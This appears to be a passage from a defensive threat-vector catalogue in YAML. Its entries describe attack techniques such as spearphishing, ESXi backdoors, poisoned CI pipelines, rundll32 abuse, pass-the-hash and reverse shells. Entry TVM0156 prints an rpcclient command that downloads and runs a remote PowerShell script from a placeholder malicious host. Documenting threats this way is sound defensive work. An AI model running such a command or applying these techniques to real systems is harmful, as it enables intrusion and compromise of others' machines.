      email itself; to avoid defenses that may inspect email attachments.  All forms
      of spearphishing are targeted at a specific individual or company. Generally,
      the links will be accompanied by social engineering text and require the user
      to actively click or copy and paste a URL into a browser, leveraging user execution.
      The visited website may compromise the web browser using an exploit, or the
      user will be prompted to download applications, documents, zip files, or even
      executables depending on the pretext for the email in the first place. Attackers
      may also include links that are intended to interact directly with an email
      reader, including embedded images intended to exploit the end system directly
      or verify the receipt of an email (i.e. web bugs/web beacons). '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0126%5D-Spearphishing-Link
  - id: TVM0127
    name: Hashicorp compromised vault admin account
    description: 'An attacker already inside the organisation may get credentials
      of a vault admin account for the Hashicorp Vault solution used to provide SAM
      service.  A policy is in place to prevent Hashicorp vault admins from reading
      secrets stored under namespaces.  As vault admin, the attacker could silently
      modifiy the policy and then get  access to any credentials stored on Hashicorp
      Vault platform. '
    criticality: Severe
    tlp: amber+strict
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0127%5D-Hashicorp-compromised-vault-admin-account
  - id: TVM0128
    name: malware to establish persistence on VMware ESXi
    description: 'Attacker may use a novel set of malware impacting VMware ESXi,  Linux
      vCenter servers, and Windows virtual machines. The set includes three pieces
      of malware named  VirtualPita, VirtualPie and VirtualGate.  The threat actor
      used a new technique leveraging malicious vSphere Installation Bundles (VIBs)
      to install VirtualPita and VirtualPie on the ESXi hypervisors. The deployment
      of the malware needs admin-level privileges to the ESXi hypervisor and SSH service
      for remote access. For more details on this technique, please see [MDT001]  **VirtualPita**
      malware is a 64-bit backdoor that creates a listener on a  hardcoded port number
      on a VMware ESXi server. The backdoor often utilises VMware service names and
      ports to masquerade as a legitimate service. This backdoor supports:     - arbitrary
      command execution,     - file upload and download,     - and the ability to
      start and stop vmsyslogd . Variants of this malware were found to listen on
      a Virtual Machine Communication Interface (VMCI) and log this activity to the
      file sysclog .  Mandiant discovered additional VirtualPita samples persistent
      as an init.d startup service on Linux vCenter systems. To disguise themselves,
      the binaries shared the name of the legitimate binary KSMD (Kernel Same-Page
      Merging Daemon).  **VirtualPie** is a lightweight backdoor written in Python
      that spawns a daemonised IPv6 listener on a hardcoded port on a VMware ESXi
      server. It supports:     - arbitrary command line execution,     - file transfer
      capabilities,     - and reverse shell capabilities.  Communications use a custom
      protocol and are encrypted using RC4.  **VirtualGate** is a utility program
      written in C that is comprised of two parts, a dropper, and the payload. The
      memory only dropper deobfuscates a second stage DLL payload that uses VMware’s
      virtual machine communication  interface (VMCI) sockets to run commands on a
      **guest virtual machine** from a hypervisor host, or between guest virtual machines
      on thesame host. '
    criticality: Severe
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0128%5D-malware-to-establish-persistence-on-VMware-ESXi
  - id: TVM0129
    name: Email with an extended MAPI property containing UNC path
    description: 'An attacker sends an email with an extended MAPI property, with
      a UNC path to an SMB (TCP 445) to network share on a threat actor-controlled
      server. A vulnerable Microsoft Outlook client (CVE-2023-23397) receives and
      opens that email, and a connection to the SMB share is initiated containing
      the user hashed password in an NTLM negotiation message. These credentials can
      then be used in NTLM relay attacks against other network services or attempt
      to crack the password.  The user does not need to open the message or interact
      with it in any way. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0129%5D-Email-with-an-extended-MAPI-property-containing-UNC-path
  - id: TVM0130
    name: Exposed private repositories
    description: 'Exposed repositories with sensitive information inside of them can
      lead to several cybersecurity threats, such as:  - Code Theft: Once the code
      is publicly visible, it can be easily accessed and copied by anyone.  Attackers
      can download the code and use it for their own malicious or monetary purposes.  -
      Vulnerability Exploitation: Publicly visible code repositories can be scanned
      by automated tools  that look for vulnerabilities in the code. Attackers can
      exploit these vulnerabilities to gain access to sensitive data or to launch
      attacks on other systems.  - Social Engineering Attacks: Hackers can use the
      information available in the code repository  to launch social engineering attacks
      on the organization or its employees. They can use this  information to craft
      phishing emails that appear to be legitimate and trick employees   into revealing
      sensitive information.  - Reputational Damage: If the code repository contains
      sensitive information or proprietary code,  its public exposure can lead to
      loss of trust and reputation damage for the organization.  This can result in
      financial losses, legal penalties, and other negative consequences.  Those scenarios
      can occur if there is a lack or poorly configured access control, potential
      human error or malicious insider intent. '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0130%5D-Exposed-private-repositories
  - id: TVM0131
    name: Direct poisoned pipeline execution
    description: 'An attacker with an existing access to a code repository could modify
      the CI configuration file inside of it. The CI pipeline then is triggered to
      start Execution. Since the execution is defined by commands in the CI configuration
      file essentialy the attacker can run those malicious commands on the build node. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0131%5D-Direct-poisoned-pipeline-execution
  - id: TVM0132
    name: Indirect poisoned pipeline execution
    description: 'Several commands are run as part of the pipeline automated test
      and build processes. Rather than modifying the CI definitions directly an attacker
      could inject malicious code or commands into files which are invoked by the
      CI pipeline.  The malicious code is then going to be triggered by the pipeline
      and executed on the build nodes. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0132%5D-Indirect-poisoned-pipeline-execution
  - id: TVM0133
    name: Resource deletion
    description: 'An attacker with unauthorized access to CI/CD resources, repositories,
      Infrastructure as Code, etc. could permanently delete critical resources such
      as source code, configuration files, build scripts. This could result in disruptions
      to the CI/CD pipeline or infrastructure and lead to delays in SDLC or denial
      of service. '
    criticality: Low
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0133%5D-Resource-deletion
  - id: TVM0134
    name: Configured webhooks
    description: 'Attacker could use an exposed configured werbhook to bypass organization
      firewall and  use it as an initial access method into the organization network
      by using the SCM itself  to trigger requests into that network. This could grant
      the attacker access to  services that are not meant to be exposed, or that are
      running old and  vulnerable software versions which could be exploited. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0134%5D-Configured-webhooks
  - id: TVM0135
    name: Reconfigure branch protection
    description: 'Branch protection tools and mechanisms allow an organization to
      configure steps before a PR/MR/commit is approved into a branch. Once an attacker  has
      necessairy permissions to the SCM , they may change these configurations  and
      introduce code into the branch without any user intervention or review.  This
      may lead to an introduction of malicious code into the environment. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0135%5D-Reconfigure-branch-protection
  - id: TVM0136
    name: Spearphishing Attachment
    description: 'Spearphishing messages are often crafted using pernicious social
      engineering techniques.  In Spearphishing Attachment attacks, recipients receive
      emails that  contain malicious attachments. The email message entices users
      to open  the attachment(s) using the knowlege gained - displayed sender name
      is known by the recipient - topic/subject is in the field of activity of the
      recipient - urgency of user action (less relevant TTP for spearphishing emails)  These
      attachments look like valid files. In some cases, they are  disguised as MS
      Office or PDF files. It could be that the attacker manage to capture a legit
      document, weaponise it and send it to (new) recipients (it has been observed
      that such attack can occur  within tens of minutes after the original legit
      document was released)  Attachments may:  - contain links leading to a page
      for credential harvesting. - be weaponized to install malicious software on
      the computer of the user or run some actions on the device; - or open a decoy
      document. This is quite frequent in attack conducted  by TA when the malware
      within the attachment makes some check and assess that the was not opened on
      the targeted organisation. Decoy document are meant to evade detection and avoid
      raising alert or recipient report to cyber security team.  ## common techniques
      to evade detection Attackers may use several way to try to hide visually the
      true nature of the file.  ### double extensions Attackers may use double extensions
      to masquerade the true file type to  trick users into opening files that might
      seem safe. But this TTP is  quite well addressed at front email gateway (blocking
      by default file  with several extension, usually also when within a compressed
      file)  ### Right-to-Left Override (RLTO) Another technique is to hide the real
      file extension is Right-to-Left  Override (RLTO). Windows supports languages
      that are written from right  to left using a Unicode character that causes the
      text that follows it  to be displayed in reverse, this method is used to blend
      the real file  extension with the file name. '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0136%5D-Spearphishing-Attachment
  - id: TVM0137
    name: OneNote documents abuse for malware delivery
    description: 'While the message subjects and senders vary, nearly all campaigns
      use unique messages to deliver malware, and do not use thread hijacking. Messages
      typically contain OneNote file attachments with themes such as invoice, remittance,
      shipping, and seasonal themes such as Christmas bonus, among other subjects.
      If recipient opens the .one file, he/she will be deceived into double-clicking
      an attached file icon, which runs an attached HTA or VBS file.  The file will
      call the WMI provider host (WmiPrvSE.exe) which runs powershell via CMD to download
      a malicious batch file, which will the PowerShell executable and uses it to
      run an encrypted payload, which is the AsyncRAT trojan or similar info-stealing
      malware. '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0137%5D-OneNote-documents-abuse-for-malware-delivery
  - id: TVM0138
    name: access to management plane of security, network, or endpoint management
      appliances
    description: '### overall description Cyber espionage threat actors continue to
      target technologies that do not  support endpoint detection and response (EDR)
      solutions such as firewalls,  IoT devices, hypervisors, VPN technologies (e.g.
      Fortinet, SonicWall,  Pulse Secure, and others) or endpoint management solutions
      like  Endpoint Manager Mobile (EPMM).    Those targets are often delivered as
      appliances (bundle of hardware and  software) and most of the time they do not
      have full-fleshed OS features  and come with limited command line interfaces.    Best
      practice is to have out-of-band (OoB) management from a central  management
      console (dedicated network segment).    Network seggregation, identity and access
      management for this OoB segment  has to be strictly configured and monitoring
      in place to detect any unusual source, account or actions performed.    This
      can be a challenging objective as it depends on the level of verbosity of aufit
      logs (if any).    If configuration is loose or management access is inadvertly
      allowed  from other interfaces, attackers may use valid accounts to access the  management
      plane of the device.    Moreover those devices are most of the time by definition
      inline of  network flows coming from Internet. Attacker may obtain a Zero-day  vulnerability
      resulting in access to command line interface of the  device from the Internet-facing
      interfaces or privileged access  (adminitrator).  ### examples of specific attacks
      #### attack against Fortinet Fortigate firewall The attack against Fortigate
      is an illustration of the latter.   The following appliances have been in scope:   -
      FortiGate: FortiGate units are network firewall devices which allow    for the
      control and monitoring of network traffic passing through the   devices.   -
      FortiManager: The FortiManager acts as a centralized management   platform for
      managing Fortinet devices.   - FortiAnalyzer: The FortiAnalyzer acts as a centralized
      log management    solution for Fortinet devices as well as a reporting platform.  The
      following steps generally describe the actions the threat actor took:   - Utilized
      a directory traversal zero-day (CVE-2022-41328) exploit to    write files to
      FortiGate firewall disks outside of the normal bounds    allowed with shell
      access.   - Maintained persistent access with Super Administrator privileges
      within    FortiGate Firewalls through ICMP port knocking    - Circumvented firewall
      rules active on FortiManager devices with a    passive traffic redirection utility,
      enabling continued connections to    persistent backdoors with Super Administrator
      privileges   - Established persistence on FortiManager and FortiAnalyzer devices    through
      a custom API endpoint created within the device   - Disabled OpenSSL 1.1.0 digital
      signature verification of system files    through targeted corruption of boot
      files   #### attack against Ivanti Endpoint Manager Mobile (EPMM)  "An authentication
      bypass vulnerability in Ivanti EPMM allows unauthorized  users to access restricted
      functionality or resources of the application  without proper authentication,"    A
      "trusted source" informed Ivanti that CVE-2023-35078 was exploited in  attacks
      against a limited number of customers.   '
    criticality: Severe
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0138%5D-access-to-management-plane-of-security%2C-network%2C-or-endpoint-management-appliances
  - id: TVM0139
    name: Files retrieved via SMB connection
    description: ' ### The SMB Protocol SMB stands for Server Message Block. It is
      a network protocol used to  share data between computers and devices on a local
      or wide area network.  The protocol allows local network computers to interact
      with file shares.  Threat actors frequently exploit SMB for their nefarious
      activities.  One common tactic involves leveraging SMB to interact with file
      shares, including Microsoft Sharepoints, OneDrive or some NAS servers.  In doing
      so, adversaries can pull malicious files from compromised endpoints,  paving
      the way for the execution of additional malicious code.  This method poses a
      significant threat, as it allows for the clandestine transfer of harmful files
      between systems,  thereby supporting lateral movement within the network.  Threat
      actors may exploit inherent file sharing protocols like SMB/Windows Admin Shares,  either
      to connected network shares or through authenticated connections via Remote
      Desktop Protocol.  Moreover, the embedding of files can serve as a vector for
      initiating SMB connections.  For instance, embedded files containing links executed
      by Office applications may establish  connections with SMB servers under the
      threat actor''s control. This technique allows threat actors to exploit unsuspecting
      users,  initiating SMB connections that may lead to the execution of malicious
      code.  In a more advanced scenario, threat actors might specify a malicious
      server,  directing the SMB protocol to facilitate further code execution.  This
      strategic move enables them to retrieve various types of files, potentially
      leading to widespread infection across entire machines within the network.  The
      ability to specify a malicious server amplifies the threat,  as it allows threat
      actors to exercise greater control over the execution and distribution of harmful
      payloads, posing a severe risk to the overall security of the network. '
    criticality: High
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0139%5D-Files-retrieved-via-SMB-connection
  - id: TVM0140
    name: RTF file embedded in Office Documents to perform outbound connections
    description: 'A threat actor creates an office file, possibly from different type
      such as `.xsl` ,`.docx` or `.ppt` alongside embedded malicious code as a RTF
      file. This embedded file is invisible to the user as it is bundled within the
      Office document format and can execute malicious code without human interaction
      when the user opens the file, without being noticed.  For the malicious actor,
      from there on the easiest path to further compromise is to initiate a connection
      toward a malicious domain to download another payload, then executing this new
      code as a second stage. '
    criticality: High
    tlp: amber+strict
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0140%5D-RTF-file-embedded-in-Office-Documents-to-perform-outbound-connections
  - id: TVM0141
    name: JavaScript Code execution over Rundll32
    description: 'From a security point of view, executing JavaScript through Rundll32
      is like executing an HTML application. Attacker can have all the power of Internet
      Explorer, its object model, performance, rendering power and protocol support;
      without  enforcing the strict security model and user interface of the browser.
      Zone security is off, and cross-domain script access is allowed, there is read/write
      access to  the files and system registry on the client machine.  With this trick,
      JavaScript is executed outside the Internet Explorer process and script is not
      subject to security concept like Protected Mode or Sandbox. Attackers have made
      great efforts to build a command line using the perfect syntax for passing through
      all the mechanisms (library loading, command line parsing, URL syntax correctness,
      valid JavaScript, etc.) leading to JavaScript execution in an uncontrolled environment.  This
      technique may allow bypassing some security products, which may trust actions
      performed by the built-in rundll32 while specifying the script to run without
      writing any file on the file system. '
    criticality: Severe
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0141%5D-JavaScript-Code-execution-over-Rundll32
  - id: TVM0142
    name: Abusing Office OLE Stream to launch scripts interpreters
    description: 'An OLE file can be seen as a mini file system or a Zip archive:  It
      contains streams of data that look like files embedded within the OLE file.
      An OLE file can also contain storages. A storage is a folder that contains streams
      or other storages. For example, a MS Word document with VBA macros has a storage
      called “Macros”. Special streams can contain properties. A property is a specific
      value that can be used to store  information such as the metadata of a document
      (title, author, creation date, etc).  Property stream names usually start with
      the character ‘\x05’ (ASCII code 5). A threat actor can use the OLE stream to
      load and launch various hosted file on a server. '
    criticality: High
    tlp: amber+strict
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0142%5D-Abusing-Office-OLE-Stream-to-launch-scripts-interpreters
  - id: TVM0143
    name: DLL Execution over Rundll32
    description: 'Rundll32.exe is a powerful asset for adversaries to proxy execution
      of arbitrary and malicious code. It is flexible and efficient for loading code
      into memory, as may load malicious DLLs by ordinals, function names or directly.
      Rundll32.exe has a certain degree of trust; which can result in a possible AppLocker
      and Software Restriction Policies (SRP) bypass.  Adversaries rely on distinct
      vectors to infect their targets, who might get infected. Upon successful exploitation,
      malicious actors have been seen executing DLL files using Rundll32.exe for multiple
      purposes; such as download and execute a payload from a remote server (DLL path
      could be both local and remote when the DLL is hosted on a SMB share using UNC
      paths), contact C&C server to upload stolen data or dump LSASS process memory
      to obtain credentials. '
    criticality: Severe
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0143%5D-DLL-Execution-over-Rundll32
  - id: TVM0144
    name: Social engineering attack using Microsoft Teams
    description: 'Adversaries are using compromised Microsoft 365 tenants to create
      technical support-themed domains and send tech support lures via Microsoft Teams,  attempting
      to trick users of the targeted organizations using social engineering.  They
      aim to manipulate users into granting approval for multifactor authentication
      (MFA) prompts, ultimately aiming to steal their credentials.  #### Attack phases  **Preparation
      phase**  Attackers compromise an Azure tenant, rename it and add a new onmicrosoft[.]com
      subdomain. It will use security-themed or product name-themed keywords to create
      a new subdomain, such as teamsprotection.onmicrosoft[.]com  Add a new user associated
      with that domain from which the attacker will send the outbound message to the
      target tenant.  **Social engineering phase**  Attackers send a Teams chat message
      to the target from the compromised external user masquerading as a technical
      support or security team; if the targeted user accepts the message request,
      attackers send a Microsoft Teams message to convince the target to enter a code
      into the Microsoft Authenticator app on his/her mobile device. If the targeted
      user enters the code into the Authenticator app, the attacker is granted a token
      to authenticate as the targeted user.  **Post-compromise phase**  Involves information
      theft from the compromised Microsoft 365 tenant, and in some  cases, adding
      a device to the organisation as a managed device through Microsoft Entra ID
      (formerly Azure Active Directory), likely an attempt to circumvent conditional
      access policies configured to restrict access to specific resources to managed
      devices only. '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0144%5D-Social-engineering-attack-using-Microsoft-Teams
  - id: TVM0145
    name: Lateral movement abusing Azure Cross-Tenant Synchronization
    description: 'When configuring CTS, an Azure source tenant will be synchronized
      with a target tenant,  where users from the source can automatically be synchronized
      to the target tenant.  When synchronizing users, the user is only pushed from
      the source and not pulled  from the target, making this a one-sided synchronization.  However,
      if improperly configured, attackers who have already compromised a tenant and
      gained elevated privileges may exploit this feature, to move laterally to other
      connected tenants.  Attackers must look for tenants with ''Outbound Sync'' enabled,
      which allows syncing to other tenants. Next step is to locate the app used for
      CTS syncing and modify its configuration to add the compromised user into its
      sync scope, gaining access to the other tenant''s network.  This allows the
      threat actor to achieve lateral movement without requiring new user credentials. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0145%5D-Lateral-movement-abusing-Azure-Cross-Tenant-Synchronization
  - id: TVM0146
    name: Sensitive data exfiltration over Synology DiskStation Manager
    description: 'Synology NAS is a multi-functional Network-Attached Storage server,
      serving as a personal file-sharing center. Moreover, it is specially designed
      for a variety of purposes, allowing users to perform multiple tasks with the
      web-based Synology DiskStation Manager (DSM); as for example:  - Store and Share
      Files over the Internet - Manage Files with Web-Based File Station - Transfer
      Files via FTP - Sync Files with Cloud Station - Back Up Files on Computer and
      Server  Data exfiltration is the unauthorized transfer of data from an organization
      devices to an external location, it can result from either external or internal
      threats (accidentally). Employees may copy corporate data from their corporate
      workstations to external drives, as Synology NAS.  Typically, the data are files
      related to the user''s daily work, but it might contain sensitive information
      as PII.  From there, attackers can hack the potentially unprotected NAS and
      exfiltrate data. With remote work and hybrid office environments quite common,
      employees may expose data through vulnerabilities in their home computers and
      networks. Any files transferred to an insecure device are at high risk for data
      exfiltration. '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0146%5D-Sensitive-data-exfiltration-over-Synology-DiskStation-Manager
  - id: TVM0147
    name: Mobile device compromised by spyware app
    description: 'Earlier versions of spyware apps were installed on smartphones through
      vulnerabilities in commonly used apps, or involving an SMS or iMessage that
      provides a link to a website.  If clicked, this link delivers malicious software
      that compromises the device. It can also be installed over a wireless transceiver
      located near a target, or manually if attacker can steal the phone that has
      been targeted.    Since 2019, attackers have been able to install spyware on
      smartphones with a missed call on WhatsApp, including delete the record of the
      missed call, making it impossible for the owner to know anything is amiss. Another
      way is by simply sending a message to a phone that produces no notification.    In
      the latest versions of spyware does not require the user to do anything. All
      that is required for a successful spyware attack and installation is having
      a particular vulnerable app or OS installed on the device, such as vulnerabilities
      in the iMessage service in iPhones which allows for infection by simply receiving
      a message. This is known as a zero-click exploit.       Once installed, spyware
      malware can theoretically harvest any data from the device and transmit it back
      to the attacker. It can steal photos and videos, recordings, location records,
      communications, web searches, passwords, call logs and social media posts. It
      also has the capability to activate cameras and microphones for real-time surveillance
      without the permission or knowledge of the user.   '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0147%5D-Mobile-device-compromised-by-spyware-app
  - id: TVM0148
    name: Pass-the-hash on SMB network shares
    description: 'In a **Pass-the-Hash attack (PtH)**, Attackers may use offensive
      tools to load  the NTLM hash and try to connect to SMB network shares that are
      reachable  from the attacker device (SMB port is open to the internet - initial
      access)  or from a compromised station under attacker''s control - lateral movement.   Crackmapexec
      is an excellent tool to try to connect to SMB network  shares using NTLM hash
      (PtH).    It scales really well as you can simply point and shoot at a whole  subnet
      or list of IP addresses.    Attacker may obtain read-only access to SMB network
      shares and could retrieve  additional information.    They may get write access
      to the share and then be able to drop files  that victims might be enticed to
      open or to execute. '
    criticality: High
    tlp: amber+strict
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0148%5D-Pass-the-hash-on-SMB-network-shares
  - id: TVM0149
    name: Lateral movement using RDP
    description: 'Upon gaining foothold on a system (via stolen legitimate credentials,
      malicious links in spearphishing emails, misconfiguration, exploiting vulnerabilities
      in systems with unpatched VPN and RDP services, etc.), adversaries will try
      to maintain the access to the network and move laterally with RDP using tools
      such as:  SharpRDP: This tool uses the non-scriptable control of the MSTSC library
      (mstscax.dll) from the COM library for lateral movement. To do this, it relies
      on the ActiveX importer aximp.exe in the .NET SDK to generate the necessary
      DLLs (MSTSCLib.DLL and AxMSTSCLib.DLL). These DLLs contain essential classes
      for performing the lateral movement.  Tscon: Is a Windows utility introduced
      in Windows Server 2012, used to connect to sessions on a Remote Desktop Session
      Host server. It requires session and destination information. If adversaries
      have SYSTEM-level permissions, they can switch RDP sessions using "tscon" without
      a password, but in newer Windows versions, passwords may still be needed. This
      is achieved by using "psexec" to attain SYSTEM-level access, identifying sessions,
      and switching to the desired session with the "/DEST" switch, creating a new
      user session within the same Remote Desktop Connection.  Threat actor groups
      leveraged an instance with the EMPIRE backdoor to carry  out malicious activities
      on a system that had been previously infected by TrickBot.  - Attackers connected
      to a domain controller in the victim network via RDP and copied  several files
      into the hosts C$ share. The copied files included an instance of PsExec,  two
      batch scripts, an instance of the Ryuk malware, and multiple .txt files containing  lists
      of hosts within the victim environment. Many of the targeted hosts were critical  systems
      across the victim environment including domain controllers and other hosts  providing
      key management and authentication services. '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0149%5D-Lateral-movement-using-RDP
  - id: TVM0150
    name: Reverse shell or remote session from compromised station
    description: 'A reverse shell is a technique that refers to a situation where
      adversaries, who have successfully compromised a system, establish a connection
      to their own system or server. This connection allows the adversaries to gain
      remote access and control over the compromised system, enabling them to execute
      commands and perform malicious actions.    Below are the phases of how a reverse
      shell works:    System compromise: the adversaries must succeed in compromising
      the security of the system. This may involve exploiting vulnerabilities in the
      software, misconfiguration,  tricking the user into running a malicious program,
      or via other ways.    Establishing a reverse connection: Once the system has
      been compromised, the adversaries set up a reverse connection from the compromised
      system to their own. This is often done using a malicious application or script
      that runs on the compromised system and communicates with a server controlled
      by adversaries.    Remote control: With the reverse connection established,
      adversaries can have full or partial access and control over the compromised
      system. This allows them to execute commands, manipulate files, steal information,
      install additional malware, modify configurations and perform other actions
      according to their goals.   '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0150%5D-Reverse-shell-or-remote-session-from-compromised-station
  - id: TVM0151
    name: ACL removed from AWS S3 bucket
    description: 'The absence of an ACL within an AWS S3 bucket, or the creation of
      a weak ACL can create vulnerable configurations impacting the owner of the S3-bucket
      and/or through third party assets. Misconfigurations are the number one cause
      of a public cloud breach, as many datasets contain PII.  AWS S3 buckets are
      secure by default, but misconfigured S3 buckets is currently a reality. In the  absence
      of a targeted attack by an adversary, their contents can only be revealed through
      error or negligence.  Cloud technology is helping organisations in many ways
      to be better, faster and more advanced in their operations. However, processes
      to maintain this technology also need to be regarded as a priority, to ensure
      that the data is properly safeguarded.  '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0151%5D-ACL-removed-from-AWS-S3-bucket
  - id: TVM0152
    name: Malicious configuration profile delivered to mobile devices
    description: 'Configuration profiles are created with Apple iPhone Configuration
      Utility,  and they are intended for IT departments and cellular carriers; as
      it is an easy way of distributing network settings to iOS devices.    For example,
      a configuration profile can contain Wi-Fi, VPN, email, calendar,  and even passcode
      restriction settings. A cellular carrier could distribute  a configuration profile
      file containing its access point name (APN) settings, allowing users to easily
      configure cellular data settings on their device  without having to enter all
      the information manually.    However, attacker can create a profile to use resources
      under their control,  such as a malicious proxy or VPN, effectively allowing
      the attacker to  monitor everything going over the network and redirect the
      device to phishing websites or malicious pages.    The attacker could entice
      users to install those malicious profiles on their  mobile via social engineering
      e.g. spearphishing email encouraging users to  install a malicious configuration
      profile attached to the email.    Configuration profiles could also be used
      to install certificates. If a  malicious certificate was installed, the attacker
      could effectively  impersonate secure websites like banks without raising alerts
      on the  browser.    In addition, there are profiles belonging to third-party
      apps. One of the  primary risks associated is the potential for malware. Malicious
      actors may  exploit vulnerabilities within these apps to introduce harmful code
      into the  mobile devices. '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0152%5D-Malicious-configuration-profile-delivered-to-mobile-devices
  - id: TVM0153
    name: Tampering system or configuration on mobile devices
    description: Mobile phone tampering refers to the unauthorized modification of
      a mobile phone  hardware or software. This can include hacking, jailbreaking,
      and installing unauthorized  apps or firmware.    There are a number of counterfeit
      applications that are available across the app stores.  Some of these contain
      malware payloads. Many of the modified apps contain modified forms  of the original
      core binary and associated resources. The adversaries re-package these  as a
      new application and release them into third-party stores which are less under  continuous
      scan of the app store manager.    Once attacker manage to get the compromised
      app or profile installed on the device, system and configuration can be tampered
      i.e. modified to the extend of the permissions  the user has on the mobile device.
      This is where having jailed brocken a device grants  additional privileges to
      the user and therefore allows the malicious app to make changes that are normally
      blocked for users.
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0153%5D-Tampering-system-or-configuration-on-mobile-devices
  - id: TVM0154
    name: Bruteforcing using Powershell via SMB
    description: The goal is to be able to mount a network restricted share '\\TARGET\Admin$'
      leading to grant administrative privileges. As any brute-forcing attempts, it
      is trying to guess admin password. Even if the awareness about password is increasing
      year after year, it is still common to use standard and generic password such
      as "admin" or "password". Most brute-forcing solutions are now storing attempts
      made in a .txt files that allow you to retrieve your current progression about
      your attempts. Delay about attempts can be scheduled to run from time to time
      to avoid any massive attempts that might triggers security alerts.
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0154%5D-Bruteforcing-using-Powershell-via-SMB
  - id: TVM0155
    name: Move laterally with SMB by abusing WMI
    description: Windows management instrumentation (WMI) is a tool that is implemented
      as service to locally and remotely manages data, operations and configuring
      settings on windows operating systems. WMI allows the administrator to see how
      the Operating system operates, what are its configurations and properties and
      to automatically collect a systems hardware and software data. It is supporting
      other scripting languages like Windows Script Host, VBScript, and PowerShell.
      WMI can be interacted locally and remotely. WMI is a powerful tool which allows
      the threat actor to install backdoor,  code execution as well as do lateral
      movement. As the threat actor has the valid credentials (password or hashes)
      they can specify malicious events to happen for example every time the victim
      restarts the computer run the executable that is present in the specified directory.  Payload
      loaded may allow the threat actor to make a separate call to the Remote Procedure
      Call (RPC)  on the victim machine, which is running over the SMB protocol. The
      named pipe is then used to move laterally with the protocol.
    criticality: High
    tlp: amber+strict
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0155%5D-Move-laterally-with-SMB-by-abusing-WMI
  - id: TVM0156
    name: Command execution with RPC over SMB
    description: 'In the dynamic landscape of cybersecurity, threat actors are wielding
      increasingly sophisticated tools,  and one insidious method gaining traction
      is the utilization of Remote Procedure Call (RPC) over Server Message Block
      (SMB).  This protocol stack, commonly employed for Windows file and printer
      sharing, becomes a breeding ground for  malicious activities in the hands of
      threat actors.  Consider a scenario where a seemingly routine file transfer
      conceals a more nefarious motive.  Threat actors exploit vulnerabilities in
      RPC over SMB to execute commands remotely, providing them with a silent gateway
      into systems.  For instance, a threat actor might employ a command like: ```bash
      rpcclient -c "run powershell.exe -Command Invoke-Expression (New-Object Net.WebClient).DownloadString(''http://malicious-site.com/malware.ps1'')"
      -U "<Username>%<Password>" <Target_IP> ``` In this example, the threat actor
      utilizes the "rpcclient" tool to remotely execute PowerShell code on the target
      system.  The PowerShell command then downloads and executes a malicious script
      from a remote server,  allowing the threat actor to establish control and potentially
      compromise the system.  By infiltrating networks through this method, threat
      actors circumvent traditional defenses, potentially gaining unfettered access
      to sensitive data. Defending against such attacks demands proactive measures.
